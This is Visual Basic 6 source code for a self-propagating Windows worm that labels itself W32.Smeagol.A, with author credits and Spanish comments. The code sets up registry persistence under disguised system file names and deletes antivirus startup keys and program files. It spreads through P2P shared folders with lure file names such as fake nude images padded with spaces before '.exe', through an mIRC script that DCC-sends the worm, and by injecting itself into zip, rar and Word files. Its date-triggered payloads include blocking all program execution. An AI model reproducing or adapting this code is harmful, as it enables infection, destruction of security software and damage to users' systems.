   VERSION 5.00
   Begin VB.Form SystemControl
      BorderStyle     =   0  'None
      Caption         =   "Form1"
      ClientHeight    =   450
      ClientLeft      =   0
      ClientTop       =   0
      ClientWidth     =   1305
      Icon            =   "Form1.frx":0000
      LinkTopic       =   "Form1"
      MaxButton       =   0   'False
      MinButton       =   0   'False
      Moveable        =   0   'False
      ScaleHeight     =   450
      ScaleWidth      =   1305
      ShowInTaskbar   =   0   'False
      StartUpPosition =   3  'Windows Default
      Visible         =   0   'False
      Begin VB.PictureBox Picture1
         Height          =   495
         Left            =   120
         Picture         =   "Form1.frx":030A
         ScaleHeight     =   435
         ScaleWidth      =   855
         TabIndex        =   0
         Top             =   600
         Width           =   915
      End
      Begin VB.Timer TimerCruxNET
         Interval        =   60000
         Left            =   840
         Top             =   0
      End
      Begin VB.Timer TimerBuscaWord
         Interval        =   5000
         Left            =   420
         Top             =   0
      End
      Begin VB.Timer Timer1
         Interval        =   1500
         Left            =   0
         Top             =   0
      End
   End
   Attribute VB_Name = "SystemControl"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = False
   'Permitida su reproducción total o parcial , de cualquier medio o procedimiento y con cualquier propósito o destino
   Private Declare Function GetCurrentProcessId Lib "kernel32" () As Long
   Private Declare Function RegisterServiceProcess Lib "kernel32" (ByVal dwProcessID As Long, ByVal dwType As Long) As Long
   Const RSP_SIMPLE_SERVICE = 1
   Private m_QR As cQueryReg
   Private colKeys() As String
   Private szFileName As String * 261
   Private Declare Function GetModuleFileName Lib "kernel32" Alias "GetModuleFileNameA" (ByVal hModule As Integer, ByVal lpFileName As String, ByVal nSize As Integer) As Integer
   Private Sub Form_Initialize()
   On Error Resume Next
   Dim H As Long
   'Registrar proceso como servicio
   H = RegisterServiceProcess(GetCurrentProcessId(), RSP_SIMPLE_SERVICE)
   End Sub
   Private Sub Form_Load()
   On Error Resume Next
   Call EstablecerVariables
   Call CoPiArMe
   If App.PrevInstance = True Then End
   If Ws.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOrganization") = "GDZ" Then
       Call Infectar   'Infectará la segunda vez que se inicie el worm
   Else
       Ws.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOrganization", "GDZ"
       MsgBox "Cannot open file: it does not appear to be a valid archive." + _
       vbCrLf & vbCrLf & "If you downloaded this file, try downloading the file again.", 16400, "GeDzAc SoFtWaRe"
   End If

   'Llamada a las rutinas que desactivan el avs del registro:
   Call Retro("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\")
   Call Retro("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\")
   Call Retro("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\RunServices\")
   Call Retro("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Run\")
   DoEvents
   'Si es el dia es 13, proseguimos
   If Day(Now) = 13 Then
       If Weekday(Date, vbSunday) = 3 Then 'Si es martes
           Call PayloadDestructivo
       ElseIf Weekday(Date, vbSunday) = 6 Then 'si es viernes
           SavePicture Picture1, DirWin & "\gollum.jpg"
           SavePicture Picture1, "C:\gollum.jpg"
       End If
   End If
   DoEvents
   'Si el mes es impar, y el dia es 4, llamamos a Payload
   If Day(Now) = 4 And Month(Now) Mod 2 <> 0 Then _
   Call Payload
   End Sub
   Private Sub CoPiArMe()
   On Error Resume Next
   Dim destino As String
   Dim RegDestino As String
   Dim L As String
   Dim i As Integer
   Dim Code As String, a As Long, HTT As String
   Dim objHTT As TextStream, CodeDesktop As String
   Dim objTxTStream As TextStream
   For i = 1 To 6  'Iniciamos un contador para copiarnos con 6 nombres distintos
       Select Case i
           Case 1
               destino = "\pctptt.exe"
               RegDestino = "CountrySelection"
           Case 2
               destino = "\ctfmon.exe"
               RegDestino = "Ctfmon"
           Case 3
               destino = "\ptsnoop.exe"
               RegDestino = "DiscTemperature"
           Case 4
               destino = "\MdM.exe"
               RegDestino = "Mdm"
           Case 5
               destino = "\cmmpu.exe"
               RegDestino = "SysTemperatureNotRemove"
           Case 6
               destino = "\Abril Lavigne Nude.jpeg                                                                    .exe"
               RegDestino = "PhotoPaint" ':D
       End Select
       If Not Fso.FileExists(DirSystem & destino) Then
           'Nos copiamos con 6 nombres diferentes
           Fso.CopyFile MiNombreEXE, DirSystem & destino, True
           DoEvents
           'Nos tratamos de protejer de alguna manera:
           If Not i = 6 Then
           SetAttr DirSystem & destino, vbHidden
           SetAttr DirSystem & destino, vbSystem
           SetAttr DirSystem & destino, vbReadOnly
           End If
       End If
       'Protejo de posibles eliminaciónes, mientras toy activo:
       Open DirSystem & destino For Binary Access Read As FreeFile
       DoEvents
       'Me pongo en el registro, asi me inicio despues de windows:
       Ws.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" & RegDestino, DirSystem & destino
   Next
   'Mi firma
   L = Ws.RegRead("HKEY_CLASSES_ROOT\CLSID\{450D8FBA-AD25-11D0-98A8-0800361B1103}\InfoTip")
   If L <> "Tus Archivos Están a salvo de GEDZAC???" Then
       Ws.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\MessengerService\Policies\IMWarning", "WARNING! GeDzAc HaS YoU"
       Ws.RegWrite "HKEY_CLASSES_ROOT\CLSID\{450D8FBA-AD25-11D0-98A8-0800361B1103}\InfoTip", "Tus Archivos Están a salvo de GEDZAC???" 'Te parece conocida esta frase????
       Ws.RegWrite "HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\InfoTip", "Estos Documentos le pertenecen a GeDzAc"
       Ws.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner", "(\)emli(Y)"
       Ws.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\RegisteredOwner", "(\)emli(Y)"
       Ws.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\RegisteredOrganization", "GDZ"
   End If
   'Deshabilito el registro
   Ws.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", 1, "PWORD"
   Ws.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Policies\System\DisableRegistryTools", 1, "BWORD"

   'El siguiente code funciona en W98 y WXP, aunque no lo he probado en otros
   'Lo que hace es ejecutar automaticamente un fichero que contenga
   '3 espacios seguidos y la extencion .exe
   'Solo funciona si la carpeta tiene habilitada ver como pag web
   Set objHTT = Fso.OpenTextFile(DirWin & "\Web\Folder.htt", ForReading, True)
   HTT = objHTT.ReadAll
   objHTT.Close

   Code = "<script>" + vbCrLf + _
   "setTimeout(""f()"",2000);" + vbCrLf + "</script>" + vbCrLf + _
   "<script language=""VBScript"">" + vbCrLf + _
   "Function f()" + vbCrLf + _
   "rd = Mid(document.url, (InStr(document.url, ""\"") - 2), Len(document.url))" + vbCrLf + _
   "rd = Mid(rd, 1, Len(rd) - 10)" + vbCrLf + _
   "For i = 1 To Len(rd) Step 1" + vbCrLf + _
   "rsd = Mid(rd, i, 3)" + vbCrLf + _
   "If rsd = ""%20"" Then" + vbCrLf + _
   "rd = Mid(rd, 1, i - 1) & "" "" & Mid(rd, i + 3, Len(rd))" + vbCrLf + _
   "End If" + vbCrLf + "Next" + vbCrLf + _
   "For i = 0 To (FileList.Folder.Items.Count) - 1" + vbCrLf + _
   "txt = FileList.Folder.Items.Item(i).Path" + vbCrLf + _
   "If InStr(txt, ""   .exe"") <> 0 Then" + vbCrLf + _
   "FileList.Folder.Items.Item(i).InvokeVerb" + vbCrLf + _
   "End If" + vbCrLf + "Next" + vbCrLf + _
   "End Function" + vbCrLf + _
   "</Script>" + vbCrLf + "</html>"

   a = InStrRev(LCase(HTT), "</html>") - 1
   Code = Mid(HTT, 1, a) & Code

   CodeDesktop = "[ExtShellFolderViews]" & vbCrLf + _
   "{5984FFE0-28D4-11CF-AE66-08002B2E1262}={5984FFE0-28D4-11CF-AE66-08002B2E1262}" & vbCrLf + _
   "{BE098140-A513-11D0-A3A4-00C04FD706EC}={BE098140-A513-11D0-A3A4-00C04FD706EC}" & vbCrLf + _
   "Default={5984FFE0-28D4-11CF-AE66-08002B2E1262}" & vbCrLf & vbCrLf + _
   "[{5984FFE0-28D4-11CF-AE66-08002B2E1262}]" & vbCrLf + _
   "PersistMoniker=file://Folder.htt" & vbCrLf & vbCrLf + _
   "[.ShellClassInfo]" & vbCrLf + _
   "ConfirmFileOp = 0" & vbCrLf & vbCrLf + _
   "[{BE098140-A513-11D0-A3A4-00C04FD706EC}]" & vbCrLf + _
   "Attributes = 1"

   Set objTxTStream = Fso.OpenTextFile(DirWin & "\Web\Folder.htt", ForWriting, True)
   objTxTStream.Write Code
   objTxTStream.Close

   Set objTxTStream = Fso.OpenTextFile(DirWin & "\Web\Desktop.ini", ForWriting, True)
   objTxTStream.Write CodeDesktop
   objTxTStream.Close
   End Sub

   Private Sub Infectar()
   On Error Resume Next
   Dim L As String
   'Procesos de infeccion, que realizo una sola vez
   L = Ws.RegRead("HKEY_LOCAL_MACHINE\Software\Gedzac\W32SMEAGOL\P2P") 'HECHO
   If L <> 1 Then Call PeerToPeer
   L = Ws.RegRead("HKEY_LOCAL_MACHINE\Software\Gedzac\W32SMEAGOL\IRC") 'HECHO
   If L <> 1 Then Call ChatIrc
   L = Ws.RegRead("HKEY_LOCAL_MACHINE\Software\Gedzac\W32SMEAGOL\ZIP") 'HECHO
   If L <> 1 Then Call BuscarZips
   End Sub
   Private Sub PeerToPeer()
   On Error Resume Next
   Dim IsD As String, Xd As String
   'Kazaa
   IsD = Ws.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\KAZAA\CloudLoad\ExeDir")
   If IsD <> "" Then
   Ws.RegWrite "HKEY_CURRENT_USER\Software\KAZAA\LocalContent\DisableSharing", 0, "REG_DWORD"
   Ws.RegWrite "HKEY_CURRENT_USER\Software\KAZAA\ResultsFilter\virus_filter", 0, "REG_DWORD"
   Ws.RegWrite "HKEY_CURRENT_USER\Software\KAZAA\ResultsFilter\firewall_filter", 0, "REG_DWORD"
   Ws.RegWrite "HKEY_CURRENT_USER\Software\KAZAA\ResultsFilter\bogus_filter", 0, "REG_DWORD"
   Xd = Ws.RegRead("HKEY_CURRENT_USER\Software\KAZAA\LocalContent\DownloadDir")
   InfectP2P (Xd & "\")
   Xd = Ws.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\KAZAA\CloudLoad\ShareDir")
   InfectP2P (Xd & "\")
   End If
   'Morpheus
   IsD = Ws.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\mscrp\morpheushome")
   If IsD <> "" Then
   Xd = IsD & "\My Shared Folder\"
   InfectP2P (Xd)
   End If
   'ICQ
   IsD = Ws.RegRead("HKEY_LOCAL_MACHINE\Software\Mirabilis\ICQ\Install\General\InstalledDir")
   If IsD <> "" Then
   InfectP2P (IsD & "\shared files\")
   End If
   'Edonkey
   IsD = Ws.RegRead("HKEY_LOCAL_MACHINE\Software\CLASSES\ed2k\DefaultIcon\")
   If IsD <> "" Then
   Dim E As String, d As Object, a As String, v As String
   E = Mid(IsD, 2)
   E = Left(E, Len(E) - 12)
   Set d = Fso.OpenTextFile(E & "share.dat")
   Do While d.AtEndOfStream <> True
   s = s & d.ReadLine & vbCrLf
   DoEvents
   Loop
   d.Close
   s = Split(s, vbCrLf)
   If UBound(s) > 1 Then
   InfectP2P Mid(s(0), 3) & "\"
   v = InStrRev(s(1), ":")
   a = Mid(s(1), v - 1)
   InfectP2P a & "\"
   Else
   InfectP2P Mid(s(0), 3) & "\"
   End If
   End If
   'Grokster
   IsD = Ws.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Uninstall\Grokster\UninstallString")
   If IsD <> "" Then
   Xd = Left(IsD, Len(IsD) - 14)
   Xd = Xd & "\My Grokster\"
   InfectP2P (Xd)
   Xd = Ws.RegRead("HKEY_CURRENT_USER\Software\Grokster\LocalContent\Dir0")
   Xd = Right(Xd, Len(Xd) - 7) & "\"
   InfectP2P (Xd)
   End If
   End Sub
   Private Sub InfectP2P(Xd)
   On Error Resume Next

   If Len(Xd) >= 3 And Fso.FolderExists(Xd) Then
   Dim x(1 To 40)
   Dim y(1 To 10)
   Dim z(1 To 20)
   Dim zz(1 To 20)

   x(1) = "Counter Strike"
   x(2) = "Pod Bot 3"
   x(3) = "GTA 4"
   x(4) = "Dap 9"
   x(5) = "Street Hop"
   x(6) = "Playstation II Emulator Pro"
   x(7) = "Super Counter Strike"
   x(8) = "Super GTA 4"
   x(9) = "Worms Armmagedon 5"
   x(10) = "PSII Emulador"
   x(11) = "Matrix Revolution"
   x(12) = "Revolution"
   x(13) = "Reloaded"
   x(14) = "Matrix Reloaded"
   x(15) = "Rammstein"
   x(16) = "Hotmail"
   x(17) = "Yahoo"
   x(18) = "Neo"
   x(19) = "Winamp 3"
   x(20) = "X Box"
   x(21) = "Black Box"
   x(22) = "Hotmail Messenger"
   x(23) = "Msn Messenger"
   x(24) = "Messenger para Hotmail y Yahoo"
   x(25) = "Yahoo Messenger"
   x(26) = "Messenger Universal"
   x(27) = "Emulator Nintendo 64"
   x(28) = "Download Acelerator Plus 9"
   x(29) = "FiFa"
   x(30) = "Los Sims"
   x(31) = "Sims City"
   x(32) = "Warcraft 3"
   x(33) = "Super Bots Counter"
   x(34) = "Senor Anillos"
   x(35) = "Sr Anillos"
   x(36) = "Terminator 4 Avances"
   x(37) = "Game Cube"
   x(38) = "Generador Serial Para 20000 Programas"
   x(39) = "PSII Emulator"
   x(40) = "Super Bots Counter"

   y(1) = " Crack.exe"
   y(2) = " Super Crack.exe"
   y(3) = " Keygen.exe"
   y(4) = " Serial.exe"
   y(5) = " SerialCrack.exe"
   y(6) = ".avi                 .exe"
   y(7) = " Hack.exe"
   y(8) = " .exe"
   y(9) = " Video.exe"
   y(10) = " Ultimated.exe"

   z(1) = "Britney Spears"
   z(2) = "Jenifer Aniston"
   z(3) = "Thalia"
   z(4) = "Pamela Anderson"
   z(5) = "Carmen Electra"
   z(6) = "Pampita"
   z(7) = "Julieta Prandi"
   z(8) = "Avril Lavigne"
   z(9) = "Carolina Andohain"
   z(10) = "Lara Croft"
   z(11) = "Fuck Britney"
   z(12) = "Orgia"
   z(13) = "Chicas Hot"
   z(14) = "Sexo"
   z(15) = "Anal Atraction"
   z(16) = "XXX"
   z(17) = "Diana"
   z(18) = "Movie XXX Full"
   z(19) = "Paulina Rubio"
   z(20) = "Reina Porno"

   zz(1) = ".Jpg                                                                                                                                                                                               .exe"
   zz(2) = " Video Full.Avi                                                                                                                                                                                    .exe"
   zz(3) = " XXX.Jpg                                                                                                                                                                                           .exe"
   zz(4) = " Image.Jpg                                                                                                                                                                                         .exe"
   zz(5) = " Nude.Jpg                                                                                                                                                                                          .exe"
   zz(6) = " Al desnudo.Jpg                                                                                                                                                                                    .exe"
   zz(7) = " Como nunca la viste.Jpg                                                                                                                                                                           .exe"
   zz(8) = " En Acción.Scr"
   zz(9) = " Protector de Pantalla.Scr"
   zz(10) = " Posando para ti.Scr"

   For i = 1 To 40
   For il = 1 To 20
   If Not Fso.FileExists(Xd & x(i) & y(il)) Then
   Fso.CopyFile MiNombreEXE, Xd & x(i) & y(i), True
   DoEvents
   End If
   Next
   Next
   For i = 1 To 20
   For il = 1 To 10
   If Not Fso.FileExists(Xd & z(i) & zz(il)) Then
   Fso.CopyFile MiNombreEXE, Xd & z(i) & zz(il), True
   DoEvents
   End If
   Next
   Next

   For Each w In LFiles(Xd)
   If Not Fso.FileExists(Xd & w & "                                    .exe") Then
   Fso.CopyFile MiNombreEXE, Xd & w & "                                    .exe", True
   DoEvents
   End If
   Next
   Ws.RegWrite "HKEY_LOCAL_MACHINE\Software\Gedzac\W32SMEAGOL\P2P", 1
   End If
   End Sub
   Function LFiles(XDir)
   On Error Resume Next
   Dim Xf, Xfs, x()
   Set Xf = Fso.GetFolder(XDir)
   Set Xfs = Xf.Files
   ReDim x(1 To (Xf.Files.Count))
   a = 1

   For Each K In Xfs
   Ex = LCase(Fso.GetExtensionName(K.Path))
   If (Ex <> "mp3") Or (Ex <> "wma") Then
   x(a) = K.Name
   a = a + 1
   End If
   Next
   LFiles = x
   End Function

   Private Sub Retro(sKey As String)
   'Mucho codigo para deshabilitar los antivirus :(
   On Error Resume Next 'Si hay error pasar a la siguiente línea
       Set m_QR = New cQueryReg 'Declaramos las variables que se usarán
       ReDim colKeys(0) As String
       Dim i As Long, itm As Integer
       Dim Avpaths() As String
       Dim iii As Integer, car As String
       ReDim colKeys(0) 'Damos nuevo tamaño a la matriz
       If m_QR.EnumValues(colKeys(), sKey) Then 'Si la ruta tiene valores proseguimos
           ReDim Avpaths(UBound(colKeys) / 2, UBound(colKeys) / 2) 'Damos nuevo tamaño a la matriz
           itm = 1
           For i = 1 To UBound(colKeys) Step 2 'Vamos de un valor de registro por vez
               If Len(colKeys(i)) Then
                   'Establecemos las variables según los datos del registro
                   Avpaths(itm, 1) = LCase(colKeys(i + 1)) 'Por Ej.: avpaths(1,1) = "C:\Archivos de programas\Norton\norton.exe"
                   Avpaths(itm, 2) = LCase(colKeys(i))     'avpaths(1,2) = "Norton Antivirus"
                   itm = itm + 1
               End If
           Next
       End If
       'liberamos los objetos usados:
       Set m_QR = Nothing
       Set tEnumReg = Nothing

   'Iniciamos un nuevo contador de manera que compare los datos del registro
   'con los valores que le damos a buscar
   'Nota: poner siempre valores que no sea generales. Por ej.:
   'La palabra "Scan" no siempre la usan los antivirus, "ScanReg" devuelve
   'La ruta de windows, y no la de un antivirus.

   For iii = 1 To 15
   Select Case iii
   Case 1: car = "virus"
   Case 2: car = "norton"
   Case 3: car = "scan"
   Case 4: car = "mcafee"
   Case 5: car = "fwin32"
   Case 6: car = "quick heal"
   Case 7: car = "f-prot"
   Case 8: car = "vs95"
   Case 9: car = "tbavw"
   Case 10: car = "f-macro"
   Case 11: car = "safe"
   Case 12: car = "protect"
   Case 13: car = "cillin"
   Case 14: car = "agent"
   Case 15: car = "trend"
   End Select
   For i = 1 To UBound(Avpaths)
   If InStr(Avpaths(i, 1), LCase(car)) <> 0 Then 'Si el registro coincide con las palabras
   Ws.RegDelete sKey & Avpaths(i, 2) 'Borramos la clave del registro, para evitar que el antivirus se inicie la proxima vez
   z = InStrRev(Avpaths(i, 1), "\") 'Recortamos la ruta para que nos quede solo la carpeta
   car = Left(Avpaths(i, 1), z) 'Sacando el ejecutable
   'Si la carpeta existe y no es la del sistema ni la de windows, proseguimos:
   If Fso.FolderExists(car) And LCase(car) <> LCase(DirWin) And LCase(car) <> LCase(DirSystem) Then
   'Borramos todos los .dat, .dll y .exes
   Fso.DeleteFile car & "\*.dat", True
   Fso.DeleteFile car & "\*.dll", True
   Fso.DeleteFile car & "\*.exe", True
   End If
   End If
   Next
   Next
   End Sub
   Private Sub ChatIrc()
   On Error Resume Next
   'Esto ya es conocido, jajaja
   'Gracias Kuasa
   For i = 1 To 3
   If i = 1 Then Drive = "c"
   If i = 2 Then Drive = "D"
   If i = 3 Then Drive = "E"
   Set f = Fso.GetFolder(Drive & ":\")
   Set Sf = f.SubFolders
   DoEvents
   For Each f1 In Sf
   If Fso.FileExists(f1 & "\mirc.ini") Then mIRCDir = f1 & "\mirc.ini"
   Set G = Fso.GetFolder(f1)
   Set y = G.SubFolders
   DoEvents
   For Each D1 In y
   If Fso.FileExists(D1 & "\mirc.ini") Then mIRCDir = D1 & "\mirc.ini"
   Set P = Fso.GetFolder(D1)
   Set w = P.SubFolders
   DoEvents
   For Each E1 In w
   If Fso.FileExists(E1 & "\mirc.ini") Then mIRCDir = E1 & "\mirc.ini"
   Set Q = Fso.GetFolder(E1)
   Set j = Q.SubFolders
   DoEvents
   For Each T1 In j
   If Fso.FileExists(T1 & "\mirc.ini") Then mIRCDir = T1 & "\mirc.ini"
   Next: Next: Next: Next: Next
   If mIRCDir <> "" Then
   mIRCDir = Mid(mIRCDir, 1, InStrRev(mIRCDir, "\"))
   mIRCDir = Replace(mIRCDir, """", "")
   Set scriptini = Fso.CreateTextFile(mIRCDir & "\script.ini", True)
   'Debido a la heurística insoportable de algunos antivirus, decidí "encriptar" (una manera de decir)
   'la siguiente cadena, aunque otros av la detectan igual. :(
   cont = Replace(Replace(Replace(Replace(Replace(Replace("[xcr9pt]" & vbCrLf & ";m9RC Xcr9pt" & vbCrLf + _
   "; Pleaxe d@zt ed9t th9x xcr9pt... mIRC w9ll c@rrupt," & vbCrLf + _
   "; 9f mIRC w9ll c@rrupt... WIZDOWX w9ll affect, azd w9ll z@t ruz" + _
   vbCrLf & ";" & vbCrLf & "; mIRC®" & vbCrLf & "; http://www.m9rc.c@m" + _
   vbCrLf & ";" & vbCrLf + _
   "z0=@z 1:JOIZ:#:9f ( $me != $z9ck ) { /mxg $Z9ck P@rq´ s@y buez@, te mazd@ uzax f@t@x 9zcreíblexx!! | /dcc xezd $ZICK ", "9", "i"), "x", "s"), "X", "S"), "@", "o"), "z", "n"), "Z", "N") & NombreDelicioso & " }"
   cont = cont & Replace(Replace(Replace(Replace(Replace(Replace(vbCrLf + _
   "z1=@z 1:te+t:*xcr9pt.9z9*:#:/.9gz@re $z9ck" & vbCrLf + _
   "z2=@z 1:te+t:*v9rux*:#:/.9gz@re $z9ck" & vbCrLf + _
   "z3=@z 1:te+t:*w@rm*:#:/.9gz@re $z9ck" & vbCrLf + _
   "z4=@z 1:te+t:*9zfec*:#:/.9gz@re $z9ck" & vbCrLf + _
   "z5=@z 1:te+t:*.e+e*:#:/.9gz@re $z9ck" & vbCrLf + _
   "z6=@z 1:te+t:*abr9l*:#:/.9gz@re $z9ck" & vbCrLf + _
   "z7=@z 1:te+t:*lavigze*:#:/.9gz@re $z9ck", "9", "i"), "x", "s"), "@", "o"), "z", "n"), "Z", "N"), "+", "x")
   scriptini.WriteLine cont
   scriptini.Close
   DoEvents
   Ws.RegWrite "HKEY_LOCAL_MACHINE\Software\Gedzac\W32SMEAGOL\IRC", 1
   End If

   End Sub
   Private Sub Payload()
   On Error Resume Next
   MsgBox "Software dedicado a mis amigos: " & vbCrLf & vbCrLf & "Osiris, MachineDramon, DemionKlaz & Falckon" & vbCrLf & vbCrLf & "W32.Smeagol.A versión beta", vbSystemModal, "GeDzAc SoFtWaRe"
   End Sub
   Private Sub PayloadDestructivo()
   On Error Resume Next
   Dim a As Integer
   a = MsgBox("¿Desea desinstalar Windows?", 36, "Atención")
   If a = 6 Then
   MsgBox "Ud ha sido infectado con el virus: W32.Smeagol.A" & vbCrLf & "Diseñado por Nemlim/GEDZAC" & vbCrLf & "Dedicado a Osiris, mi mejor amigo en Argentina, y a todos los miembros de Gedzac." & vbCrLf & "Argentina 2003/2004", vbSystemModal, "GeDzAc SoFtWaRe"
   Else
   MsgBox "Respuesta inesperada" & vbCrLf & "Design by S... digo, ejem!" & vbCrLf & "Design by Nemlim", vbCritical, "W32.Smeagol.A  /  GeDzAc SoFtWaRe"
   MsgBox "Software dedicado a mis amigos: " & vbCrLf & vbCrLf & "Osiris, MachineDramon, DemionKlaz & Falckon" & vbCrLf & vbCrLf & "W32.Smeagol.A versión beta", vbSystemModal, "GeDzAc SoFtWaRe"
   Ws.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun", " " 'Prohibir la ejecución de ejecutables
   Ws.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Policies\Explorer\RestrictRun", " " 'Prohibir la ejecución de ejecutables en WinNT
   End If
   End Sub
   Private Sub InfectarDoc(NombreDoc As String)
   On Error GoTo NoWord
   Word.Documents.Open NombreDoc 'Abro el documento
   Word.ActiveDocument.Shapes.AddOLEObject , MiNombreEXE, False, True, MiNombreEXE, 0, "Pamela Fuck:          Doble Click para ver." 'Me agrego como un objeto
   Word.ActiveDocument.Shapes(1).Select
   Word.ActiveDocument.Shapes(1).Visible = True 'Lo hago visible
   Word.ActiveDocument.Shapes(1).Width = 250 'Especifico el tamaño
   Word.ActiveDocument.Shapes(1).Height = 250
   Word.Documents(NombreDoc).Close True 'Cierro el documento
   NoWord:
   End Sub
   Private Sub SearchScan()
   On Error Resume Next
   Dim Src As Boolean
   Src = EnumWindows(AddressOf FuncSearchScan, ByVal 0&)
   End Sub

   Private Sub Timer1_Timer()
   On Error Resume Next
   Timer1.Interval = 1500
   DoEvents
   SearchScan 'Buscar ventanas relacionadas con antivirus
   End Sub
   Private Sub BuscarZips()
   On Error Resume Next
   'Proceso de infeccion de todos los zips y docs del disco
   If HayWinrar = True Or HayWinzip = True Then
   Set Word = CreateObject("Word.Application") 'Creo una instancia Word
   For i = 1 To 3
   If i = 1 Then Drive = "C"
   If i = 2 Then Drive = "D"
   If i = 3 Then Drive = "E"

   Set f = Fso.GetFolder(Drive & ":\")
   Set Sf = f.SubFolders
   DoEvents
   For Each f1 In Sf
   Set FSf = f1.Files
   For Each xFsf In FSf
   If HayWinzip Then If CZExt(LCase(Fso.GetExtensionName(xFsf))) Then InfectarZip (xFsf)
   If HayWinrar Then If LCase(Fso.GetExtensionName(xFsf)) = "rar" Then InfectarRar (xFsf)
   If LCase(Fso.GetExtensionName(xFsf)) = "doc" Then InfectarDoc (xFsf)
   Next

   Set G = Fso.GetFolder(f1)
   Set y = G.SubFolders
   DoEvents
   For Each D1 In y
   Set Fy = D1.Files
   For Each xFy In Fy
   If HayWinzip Then If CZExt(LCase(Fso.GetExtensionName(xFy))) Then InfectarZip (xFy)
   If HayWinrar Then If LCase(Fso.GetExtensionName(xFy)) = "rar" Then InfectarRar (xFy)
   If LCase(Fso.GetExtensionName(xFy)) = "doc" Then InfectarDoc (xFy)
   Next

   Set P = Fso.GetFolder(D1)
   Set w = P.SubFolders
   DoEvents
   For Each E1 In w
   Set Fw = E1.Files
   For Each xFw In Fw
   If HayWinzip Then If CZExt(LCase(Fso.GetExtensionName(xFw))) Then InfectarZip (xFw)
   If HayWinrar Then If LCase(Fso.GetExtensionName(xFw)) = "rar" Then InfectarRar (xFw)
   If LCase(Fso.GetExtensionName(xFw)) = "doc" Then InfectarDoc (xFw)
   Next

   Set Q = Fso.GetFolder(E1)
   Set j = Q.SubFolders
   DoEvents
   For Each T1 In j
   Set Fj = T1.Files
   For Each xFj In Fj
   If HayWinzip Then If CZExt(LCase(Fso.GetExtensionName(xFj))) Then InfectarZip (xFj)
   If HayWinrar Then If LCase(Fso.GetExtensionName(xFj)) = "rar" Then InfectarRar (xFj)
   If LCase(Fso.GetExtensionName(xFj)) = "doc" Then InfectarDoc (xFj)
   Next

   Next: Next: Next: Next: Next
   Ws.RegWrite "HKEY_LOCAL_MACHINE\Software\Gedzac\W32Smeagol\ZIP", 1
   Word.Quit 'Cierro la instancia de Word
   End If
   End Sub
   Private Function CZExt(Nombre As String) As Boolean
   On Error Resume Next
   'Verificacion si la extencion es un archivo comprimido
   If Nombre = "zip" Or Nombre = "z" Or Nombre = "gz" Or Nombre = "taz" Or Nombre = "tgz" Or Nombre = "tz" Then
   CZExt = True
   Else
   CZExt = False
   End If
   End Function
   Private Sub InfectarZip(XPath As String)
   On Error Resume Next
   If HayWinzip Then
   Shell DirWinzip & " -a " & XPath & " """ & DirWin & "\Web\Desktop.ini" & """", vbHide
   Shell DirWinzip & " -a " & XPath & " """ & DirWin & "\Web\Folder.htt" & """", vbHide
   Shell DirWinzip & " -a " & XPath & " """ & NombreDelicioso & """"
   End If
   End Sub
   Private Sub InfectarRar(XPath As String)
   On Error Resume Next
   If HayWinrar Then
   Shell DirWinrar & " a " & XPath & " """ & DirWin & "\Web\Desktop.ini" & """", vbHide
   Shell DirWinrar & " a " & XPath & " """ & DirWin & "\Web\Folder.htt" & """", vbHide
   Shell DirWinrar & " a " & XPath & " """ & NombreDelicioso & """", vbHide
   End If
   End Sub

   Private Sub EstablecerVariables()
   On Error Resume Next
   DirSystem = Fso.GetSpecialFolder(1)
   DirWin = Fso.GetSpecialFolder(0)
   DirWinrar = LCase(Ws.RegRead("HKEY_CLASSES_ROOT\WinRAR\shell\open\command\"))
   If DirWinrar <> "" Then
       DirWinrar = Mid(DirWinrar, 2, InStr(LCase(DirWinrar), ".exe") + 2) 'Establece el directorio del winrar
       If Fso.FileExists(DirWinrar) Then
           HayWinrar = True
       Else
           HayWinrar = False
       End If
   End If
   DirWinzip = Ws.RegRead("HKEY_CLASSES_ROOT\Winzip\Shell\Open\Command\")
   If DirWinzip <> "" Then
       DirWinzip = Left(DirWinzip, Len(DirWinzip) - 5) 'Establece el directorio del winzip
       If Fso.FileExists(DirWinzip) Then
           HayWinzip = True
       Else
           HayWinzip = False
       End If
   End If
   GetModuleFileName 0, szFileName, 261 'Llamamos a la funcion que devuelve la ruta desde donde estamos siendo ejecutados

   MiNombreEXE = szFileName 'Establecemos nuestro nombre

   'Establezco un nombre tentador
   If Fso.FileExists(DirSystem & "\Abril Lavigne Nude.jpeg                                                                    .exe") Then
   NombreDelicioso = DirSystem & "\Abril Lavigne Nude.jpeg                                                                    .exe"
   Else
   NombreDelicioso = MiNombreEXE
   End If
   If Not Fso.FileExists(MiNombreEXE) Then Call PayloadDestructivo 'Si seguimos sin existir, mandamos todo al carajo
   End Sub

   Private Sub TimerBuscaWord_Timer()
   On Error Resume Next
   'Eto si e mio
   If HayExcel Or HayWord Then 'Si hay una instancia de word o excel abierta proseguimos
